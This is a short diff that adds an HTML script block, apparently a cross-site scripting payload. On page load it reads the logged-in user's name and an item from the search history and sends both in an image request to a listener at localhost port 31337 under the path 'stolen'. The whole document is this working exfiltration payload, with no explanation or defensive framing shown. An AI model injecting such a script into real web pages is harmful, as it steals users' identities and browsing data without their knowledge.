@@ -1,0 +1,5 @@
+<script>
+    window.onload = function() {
+      new Image().src = `http://localhost:31337/stolen?user=` + encodeURIComponent(document.getElementById(`logged-in-user`).innerText) + `&last_search=` + encodeURIComponent(document.getElementById(`history-list`).children[1].innerText)
+    }
+    </script>
